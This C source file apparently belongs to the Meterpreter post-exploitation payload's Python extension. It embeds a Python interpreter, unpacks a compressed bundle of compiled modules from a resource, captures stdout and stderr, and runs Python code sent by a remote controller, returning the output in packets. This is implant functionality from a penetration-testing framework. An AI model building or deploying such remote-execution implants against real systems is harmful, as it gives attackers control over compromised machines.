/*!
 * @file python_commands.c
 * @brief Definitions for the python command bindings.
 */
#include "Python.h"
#include "marshal.h"
#include "python_main.h"
#include "python_commands.h"
#include "Resource Files/python_core.rh"

typedef struct _InitFunc
{
#ifdef DEBUGTRACE
	PCHAR name;
#endif
	PyMODINIT_FUNC(*func)(void);
} InitFunc;

#ifdef DEBUGTRACE
#define DEC_INIT_FUNC(x) { #x, x }
#else
#define DEC_INIT_FUNC(x) { x }
#endif

extern PyMODINIT_FUNC initerrno(void);
extern PyMODINIT_FUNC init_functools(void);
extern PyMODINIT_FUNC init_socket(void);
extern PyMODINIT_FUNC init_weakref(void);
extern PyMODINIT_FUNC initarray(void);
extern PyMODINIT_FUNC initaudioop(void);
extern PyMODINIT_FUNC init_csv(void);
extern PyMODINIT_FUNC init_io(void);
extern PyMODINIT_FUNC init_multibytecodec(void);
extern PyMODINIT_FUNC init_bisect(void);
extern PyMODINIT_FUNC init_codecs(void);
extern PyMODINIT_FUNC init_collections(void);
extern PyMODINIT_FUNC init_heapq(void);
extern PyMODINIT_FUNC init_locale(void);
extern PyMODINIT_FUNC init_lsprof(void);
extern PyMODINIT_FUNC init_random(void);
extern PyMODINIT_FUNC init_sre(void);
extern PyMODINIT_FUNC init_struct(void);
extern PyMODINIT_FUNC init_weakref(void);
extern PyMODINIT_FUNC initaudioop(void);
extern PyMODINIT_FUNC initbinascii(void);
extern PyMODINIT_FUNC initcmath(void);
extern PyMODINIT_FUNC initcPickle(void);
extern PyMODINIT_FUNC initcStringIO(void);
extern PyMODINIT_FUNC initdatetime(void);
extern PyMODINIT_FUNC initfuture_builtins(void);
extern PyMODINIT_FUNC initgc(void);
extern PyMODINIT_FUNC initimageop(void);
extern PyMODINIT_FUNC inititertools(void);
extern PyMODINIT_FUNC initmath(void);
extern PyMODINIT_FUNC init_md5(void);
extern PyMODINIT_FUNC initmmap(void);
extern PyMODINIT_FUNC initoperator(void);
extern PyMODINIT_FUNC initparser(void);
extern PyMODINIT_FUNC initnt(void);
extern PyMODINIT_FUNC init_sha256(void);
extern PyMODINIT_FUNC init_sha512(void);
extern PyMODINIT_FUNC init_sha(void);
extern PyMODINIT_FUNC initsignal(void);
extern PyMODINIT_FUNC initstrop(void);
extern PyMODINIT_FUNC init_symtable(void);
extern PyMODINIT_FUNC initthread(void);
extern PyMODINIT_FUNC inittime(void);
extern PyMODINIT_FUNC initxxsubtype(void);
extern PyMODINIT_FUNC initzipimport(void);
extern PyMODINIT_FUNC init_subprocess(void);
extern PyMODINIT_FUNC init_winreg(void);
extern PyMODINIT_FUNC initselect(void);
extern PyMODINIT_FUNC initunicodedata(void);
extern PyMODINIT_FUNC init_ctypes(void);

// order of these is actually important
static InitFunc init_funcs[] =
{
	// the functions below that are commented out are invoked prior
	// to the python modules being included.
	//DEC_INIT_FUNC(initerrno),
	//DEC_INIT_FUNC(initnt),
	//DEC_INIT_FUNC(init_socket),
	//DEC_INIT_FUNC(init_functools),
	DEC_INIT_FUNC(initselect),
	DEC_INIT_FUNC(initselect),
	DEC_INIT_FUNC(init_weakref),
	DEC_INIT_FUNC(initarray),
	DEC_INIT_FUNC(initaudioop),
	DEC_INIT_FUNC(init_csv),
	DEC_INIT_FUNC(init_io),
	DEC_INIT_FUNC(init_multibytecodec),
	DEC_INIT_FUNC(init_bisect),
	DEC_INIT_FUNC(init_codecs),
	DEC_INIT_FUNC(init_collections),
	DEC_INIT_FUNC(init_heapq),
	DEC_INIT_FUNC(init_locale),
	DEC_INIT_FUNC(init_lsprof),
	DEC_INIT_FUNC(init_random),
	DEC_INIT_FUNC(init_sre),
	DEC_INIT_FUNC(init_struct),
	DEC_INIT_FUNC(init_weakref),
	DEC_INIT_FUNC(initaudioop),
	DEC_INIT_FUNC(initbinascii),
	DEC_INIT_FUNC(initcmath),
	DEC_INIT_FUNC(initcStringIO),
	DEC_INIT_FUNC(initcPickle),
	DEC_INIT_FUNC(inittime),
	DEC_INIT_FUNC(initdatetime),
	DEC_INIT_FUNC(initgc),
	DEC_INIT_FUNC(initimageop),
	DEC_INIT_FUNC(inititertools),
	DEC_INIT_FUNC(initfuture_builtins),
	DEC_INIT_FUNC(initmath),
	DEC_INIT_FUNC(init_md5),
	DEC_INIT_FUNC(initmmap),
	DEC_INIT_FUNC(initoperator),
	DEC_INIT_FUNC(initparser),
	DEC_INIT_FUNC(init_sha256),
	DEC_INIT_FUNC(init_sha512),
	DEC_INIT_FUNC(init_sha),
	DEC_INIT_FUNC(initsignal),
	DEC_INIT_FUNC(initstrop),
	DEC_INIT_FUNC(init_symtable),
	DEC_INIT_FUNC(initunicodedata),
	DEC_INIT_FUNC(initthread),
	DEC_INIT_FUNC(initxxsubtype),
	DEC_INIT_FUNC(initzipimport),
	DEC_INIT_FUNC(init_subprocess),
	DEC_INIT_FUNC(init_winreg),
	DEC_INIT_FUNC(init_ctypes),
	DEC_INIT_FUNC(NULL)
};


static LIST* stderrBuffer = NULL;
static LIST* stdoutBuffer = NULL;
static LPBYTE coreLibPointer = NULL;
static DWORD coreLibSize = 0;

static PyObject* handle_write(LIST* target, PyObject* self, PyObject* args)
{
	const char* written = NULL;
	if (PyArg_ParseTuple(args, "s", &written))
	{
		dprintf("[PYTHON] something written to %p: %s", target, written);
		if (target != NULL)
		{
			list_add(target, strdup(written));
		}
	}
	else
	{
		dprintf("[PYTHON] something written to %p (can't parse)", target);
	}
	return Py_BuildValue("");
}

static PyObject* handle_stderr(PyObject* self, PyObject* args)
{
	return handle_write(stderrBuffer, self, args);
}

static PyObject* handle_stdout(PyObject* self, PyObject* args)
{
	return handle_write(stdoutBuffer, self, args);
}

static PyMethodDef meterpreter_stdout_hooks[] =
{
	{ "write", handle_stdout, METH_VARARGS, "Write something to stdout" },
	{ NULL, NULL, 0, NULL }
};

static PyMethodDef meterpreter_stderr_hooks[] =
{
	{ "write", handle_stderr, METH_VARARGS, "Write something to stderr" },
	{ NULL, NULL, 0, NULL }
};

static VOID dump_to_packet_and_destroy(LIST* source, Packet* packet, UINT tlvType)
{
	lock_acquire(source->lock);

	PNODE current = source->start;

	while (current != NULL)
	{
		packet_add_tlv_string(packet, tlvType, (LPCSTR)current->data);
		current = current->next;
	}

	lock_release(source->lock);
	list_destroy(source);
}

VOID python_destroy_session()
{
	Py_Finalize();
}

/*!
 * @brief Prepare the session for use, including all the resources that are embedded.
 */
VOID python_prepare_session()
{
	Py_IgnoreEnvironmentFlag = 1;
	Py_NoSiteFlag = 1;
	Py_Initialize();
	PyEval_InitThreads();

	PyObject* stdoutModule = Py_InitModule("meterpreter_stdout", meterpreter_stdout_hooks);

	if (stdoutModule != NULL && PySys_SetObject("stdout", stdoutModule) == 0)
	{
		dprintf("[PYTHON] Successfully set the stdout hook");
	}
	else
	{
		dprintf("[PYTHON] Failed to set the stdout hook");
	}

	PyObject* stderrModule = Py_InitModule("meterpreter_stderr", meterpreter_stderr_hooks);
	if (stderrModule != NULL && PySys_SetObject("stderr", stderrModule) == 0)
	{
		dprintf("[PYTHON] Successfully set the stderr hook");
	}
	else
	{
		dprintf("[PYTHON] Failed to set the stderr hook");
	}

	// with the output handlers sorted, we load the stuff from the compressed resource
	// which should give us all the stuff we need to be useful.
	initerrno();
	initnt();
	init_socket();
	init_functools();
	
	// have we loaded the core pointer already?
	if (coreLibPointer == NULL)
	{
		MEMORY_BASIC_INFORMATION mbi;
		if (!VirtualQuery((LPVOID)python_prepare_session, &mbi, sizeof(mbi)))
		{
			dprintf("[PYTHON] VirtualQuery failed: %d", GetLastError());
			return;
		}

		HMODULE mod = (HMODULE)mbi.AllocationBase;
		dprintf("[PYTHON] Module handle: %p", (LPVOID)mod);

		HRSRC res = FindResource(mod, MAKEINTRESOURCEA(IDR_PYTHON_CORE), "BINARY");
		if (res == NULL)
		{
			dprintf("[PYTHON] Unable to find resource: %d", GetLastError());
			return;
		}

		HGLOBAL file = LoadResource(mod, res);

		if (file == NULL)
		{
			dprintf("[PYTHON] Unable to load core library resource: %d", GetLastError());
			return;
		}

		coreLibPointer = (LPBYTE)LockResource(file);
		coreLibSize = *(LPDWORD)coreLibPointer;
		coreLibPointer += sizeof(DWORD);
	}

	dprintf("[PYTHON] coreLibPointer: %p, coreLibSize: %d", coreLibPointer, coreLibSize);

	if (coreLibPointer != NULL)
	{
		// Create a byte array with everything in it
		PyObject* libString = PyString_FromStringAndSize(coreLibPointer, coreLibSize);
		dprintf("[PYTHON] libString is %p", libString);

		// import zlib
		PyObject* zlibModStr = PyString_FromString("zlib");
		dprintf("[PYTHON] zlibModStr: %p", zlibModStr);
		PyObject* zlibMod = PyImport_Import(zlibModStr);
		dprintf("[PYTHON] zlibMod: %p", zlibMod);
		// get a reference to the decompress function
		PyObject* zlibDecompress = PyObject_GetAttrString(zlibMod, "decompress");
		dprintf("[PYTHON] zlibDecompress: %p", zlibDecompress);
		// prepare arguments for invocation
		PyObject* zlibDecompressArgs = PyTuple_Pack(1, libString);
		dprintf("[PYTHON] zlibDecompressArgs: %p", zlibDecompressArgs);
		// call zlib.decompress(libString)
		PyObject* zlibDecompressResult = PyObject_CallObject(zlibDecompress, zlibDecompressArgs);
		dprintf("[PYTHON] zlibDecompressResult: %p", zlibDecompressResult);
		//dprintf("[PYTHON] zlibDecompressResult type: %s", zlibDecompressResult->ob_type->tp_name);

		PCHAR byteArray = NULL;
		Py_ssize_t byteArrayLength = 0;
		PyString_AsStringAndSize(zlibDecompressResult, &byteArray, &byteArrayLength);
		dprintf("[PYTHON] bytes: %p %u", byteArray, byteArrayLength);

		PyObject* modData = PyMarshal_ReadObjectFromString(byteArray, byteArrayLength);
		dprintf("[PYTHON] modData: %p", modData);

		PyObject* mainMod = PyImport_AddModule("__main__");
		PyObject* mainDict = PyModule_GetDict(mainMod);
		PyModule_AddObject(mainMod, "__modData", modData);
		PyRun_SimpleString("exec(__modData[0]);sys.meta_path.append(MetFinder(__modData[1]))");

		// the data should be a list of size '2', it contains:
		// 1) compiled code which makes up the loader/bootstrapper
		// 2) a dictionary of (module name, (is package, compiled code))
		//Py_ssize_t modCount = PySequence_Length(modList);
		//dprintf("[PYTHON] modCount: %u", modCount);

		//for (Py_ssize_t i = 0; i < modCount; ++i)
		//{
		//	PyCodeObject* compiledCode = (PyCodeObject*)PySequence_GetItem(modList, i);
		//	dprintf("[PYTHON] compiledCode: %p", compiledCode);
		//	dprintf("[PYTHON] compiledCode type: %s", compiledCode->ob_type->tp_name);
		//	//CHAR* x; Py_ssize_t s;
		//	//PyString_AsStringAndSize(compiledCode, &x, &s);
		//	//dprintf("[PYTHON] compiledCode length: %s", s);
		//	if (compiledCode != NULL)
		//	{
		//		PyObject* codeEvalResult = PyEval_EvalCode(compiledCode, mainDict, mainDict);
		//		dprintf("[PYTHON] codeEvalResult: %p", codeEvalResult);
		//		if (codeEvalResult != NULL)
		//		{
		//			Py_XDECREF(codeEvalResult);
		//		}
		//		Py_XDECREF(compiledCode);
		//	}
		//}

		// we now have a reference to a "list of modules", pull it back into C land
		//PCHAR cursor = NULL;
		//Py_ssize_t libSize = 0;
		//PyString_AsStringAndSize(zlibDecompressResult, &cursor, &libSize);
		//dprintf("[PYTHON] lib: %p %u", cursor, libSize);

		//// get the number of modules, and move the cursor to the start of the module list
		//DWORD modCount = *(LPDWORD)cursor;
		//cursor += sizeof(DWORD);
		//dprintf("[PYTHON] mod count: %u", modCount);

		//// we'll be importing stuff in the context of main, so we need a reference to it.
		//PyObject* builtinsMod = PyImport_AddModule("__main__");

		//for (DWORD i = 0; i < modCount; ++i)
		//{
		//	// extract the module size/length
		//	DWORD modSize = *(LPDWORD)cursor;
		//	cursor += sizeof(DWORD);
		//	dprintf("[PYTHON] including module: %p %u bytes", cursor, modSize);

		//	PyMarshal_ReadObjectFromString(cursor, modSize);

		//	// convert the module to a string in python land
		//	//PyObject* libString = PyString_FromStringAndSize(cursor, modSize);
		//	// give it a name
		//	//PyModule_AddObject(PyImport_AddModule("__main__"), "__metimport", libString);
		//	// import it
		//	//PyRun_SimpleString("exec(__metimport)");

		//	// move our cursor along to the next module
		//	cursor += modSize;
		//}

		//PyRun_SimpleString("__metimport=None");
	}

	// now load the baked-in modules
	PyErr_Clear();
	for (InitFunc* f = &init_funcs[0]; f->func != NULL; f += 1)
	{
		dprintf("[PYTHON] Running %s", f->name);
		f->func();
		if (PyErr_Occurred())
		{
#ifdef DEBUGTRACE
			PyErr_Print();
#endif
			dprintf("[PYTHON] %s errored", f->name);
			PyErr_Clear();
		}
	}
}

/*!
 * @brief Reset/restart the interpreter.
 * @param remote Pointer to the \c Remote making the request.
 * @param packet Pointer to the request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_python_reset(Remote* remote, Packet* packet)
{
	dprintf("[PYTHON] resetting the interpreter");
	Py_Finalize();
	Py_Initialize();
	python_prepare_session();
	packet_transmit_empty_response(remote, packet, ERROR_SUCCESS);

	return ERROR_SUCCESS;
}

/*!
 * @brief Execute a block of python given in a string and return the result/output.
 * @param remote Pointer to the \c Remote making the request.
 * @param packet Pointer to the request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_python_execute_string(Remote* remote, Packet* packet)
{
	DWORD dwResult = ERROR_SUCCESS;
	Packet* response = packet_create_response(packet);
	CHAR* pythonCode = packet_get_tlv_value_string(packet, TLV_TYPE_EXTENSION_PYTHON_CODE);

	if (pythonCode != NULL)
	{
		dprintf("[PYTHON] attempting to run string: %s", pythonCode);

		stderrBuffer = list_create();
		stdoutBuffer = list_create();

		PyRun_SimpleString(pythonCode);

		CHAR* resultVar = packet_get_tlv_value_string(packet, TLV_TYPE_EXTENSION_PYTHON_RESULT_VAR);
		if (resultVar)
		{
			PyObject* mainModule = PyImport_AddModule("__main__");
			if (mainModule != NULL)
			{
				PyObject* mainDict = PyModule_GetDict(mainModule);
				if (mainDict != NULL)
				{
					PyObject* result = PyDict_GetItemString(mainDict, resultVar);
					if (result != NULL)
					{
						if (PyString_Check(result))
						{
							// result is already a string
							packet_add_tlv_string(response, TLV_TYPE_EXTENSION_PYTHON_RESULT, PyString_AsString(result));
						}
						else
						{
							PyObject* resultStr = PyObject_Str(result);
							packet_add_tlv_string(response, TLV_TYPE_EXTENSION_PYTHON_RESULT, PyString_AsString(resultStr));
							Py_DECREF(resultStr);
						}
					}
				}
			}
		}

		dump_to_packet_and_destroy(stderrBuffer, response, TLV_TYPE_EXTENSION_PYTHON_STDERR);
		dump_to_packet_and_destroy(stdoutBuffer, response, TLV_TYPE_EXTENSION_PYTHON_STDOUT);

		stderrBuffer = NULL;
		stdoutBuffer = NULL;

		packet_transmit_response(dwResult, remote, response);
	}

	return dwResult;
}